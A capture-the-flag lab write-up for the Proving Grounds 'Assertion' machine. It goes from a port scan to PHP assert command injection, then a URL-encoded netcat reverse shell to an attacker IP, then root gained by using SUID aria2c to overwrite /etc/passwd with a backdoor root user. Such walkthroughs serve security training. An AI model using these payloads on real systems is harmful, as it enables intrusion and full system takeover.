---
layout: default
title: Assertion
parent: Proving Grounds Play
nav_order: 29
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/assertion101]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.232.94
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-16 19:19 EST
Nmap scan report for 192.168.232.94
Host is up (0.062s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6e:ce:aa:cc:02:de:a5:a3:58:5d:da:2b:ef:54:07:f9 (RSA)
|   256 9d:3f:df:16:7a:e1:59:58:84:4a:e3:29:8f:44:87:8d (ECDSA)
|_  256 87:b5:6f:f8:21:81:d3:3b:43:d0:40:81:c0:e3:69:89 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Assertion
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.26 seconds

```

# Enumeration

---

## Users

## 80 | HTTP

![index](../../../assets/images/ctfs/proving_grounds/assertion/index.png)

The URL looks susceptible to LFI, but we get a custom message after a simple test.

![brother](../../../assets/images/ctfs/proving_grounds/assertion/brother.png)

# Exploitation

---

Reaching the following page from HackTricks there are some _LFI via PHP's 'assert'_ options when the site appears to be filtering traversal strings, such as this site is doing.

[HackTricks File Inclusion Page](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

```bash
http://192.168.232.94/index.php?page=%27%20and%20die(system(%22whoami%22))%20or%20%27
```

![whoami](../../../assets/images/ctfs/proving_grounds/assertion/whoami.png)

Generate a reverse shell with revshellgen

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/assertion101]
└─$ revshellgen -i 192.168.45.217 -p 9001 -t nc-mknod

[+] Reverse shell command:

rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/assertion101]
└─$ urlencode "rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l"
rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%209001%201%3E%2Ftmp%2Fl

```

Executing the following payload we get a reverse shell in our netcat listener.

```bash
URL: 192.168.232.94/index.php?page=' and die(system("rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%209001%201%3E%2Ftmp%2Fl")) or '


┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/assertion101]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.232.94] 59352
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# Post-Exploitation

---

## Locate id_rsa

Within _/var/www/html_ there is a _.todeletelater_ directory which contains a _id_rsa_ private key.

```bash
www-data@assertion:/var/www/html$ ls -la
total 196
drwxr-xr-x 9 root root  4096 Jan 16  2020 .
drwxr-xr-x 3 root root  4096 Sep  8  2020 ..
drwxr-xr-x 2 root root  4096 Jan 16  2020 .todeletelater
drwxr-xr-x 2 root root  4096 Jan 16  2020 Source
-rwxr-xr-x 1 root root 20735 Jan 16  2020 about.php
-rwxr-xr-x 1 root root 22301 Jan 16  2020 blog-single.php
-rwxr-xr-x 1 root root 15274 Jan 16  2020 blog.php
-rwxr-xr-x 1 root root 11556 Jan 16  2020 contact.php
drwxr-xr-x 2 root root  4096 Jan 16  2020 css
drwxr-xr-x 2 root root  4096 Jan 16  2020 fonts
-rwxr-xr-x 1 root root 17070 Jan 16  2020 gallery.php
drwxr-xr-x 9 root root  4096 Jan 16  2020 img
-rwxr-xr-x 1 root root 36971 Jan 16  2020 index.php
drwxr-xr-x 2 root root  4096 Jan 16  2020 js
drwxr-xr-x 2 root root  4096 Jan 16  2020 pages
-rwxr-xr-x 1 root root 23805 Jan 16  2020 schedule.php

www-data@assertion:/var/www/html$ cd .todeletelater/
www-data@assertion:/var/www/html/.todeletelater$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Jan 16  2020 .
drwxr-xr-x 9 root root 4096 Jan 16  2020 ..
-r--r--r-- 1 root root 1766 Jan 16  2020 id_rsa

```

Looking at _/home_ there are two user directories: _fnx_ and _soz_

Deadend

## Check SUID Permissions

```bash
www-data@assertion:/dev/shm$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/at
/usr/bin/aria2c
/usr/bin/newgrp
/usr/bin/newgidmap
```

_/usr/bin/aria2c_ is interesting.

We can use _aria2c_ to overwrite files we download from the attack machine.

Let's add a user to the /etc/passwd file on our attack machine and then upload to the target.

The following will add a root user with the password _i<3hacking_

```bash
evil:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:evil:/home/evil:/bin/bash
```

![evil](../../../assets/images/ctfs/proving_grounds/assertion/evil.png)

Now move to the _/etc_ directory on the target and upload our malicious _passwd_ file

```bash
www-data@assertion:/etc$ aria2c -o passwd http://192.168.45.217:8000/passwd --allow-overwrite=true

11/17 02:51:11 [NOTICE] Downloading 1 item(s)
\
11/17 02:51:11 [NOTICE] Download complete: /etc/passwd

Download Results:
gid   |stat|avg speed  |path/URI
======+====+===========+=======================================================
87fe7c|OK  |        n/a|/etc/passwd

Status Legend:
(OK):download completed.


```

Now we can switch user's to our _evil_ user and get a root shell.

```bash
www-data@assertion:/etc$ su evil
Password:
root@assertion:/etc# id
uid=0(root) gid=0(root) groups=0(root)
root@assertion:/etc# whoami
root

```
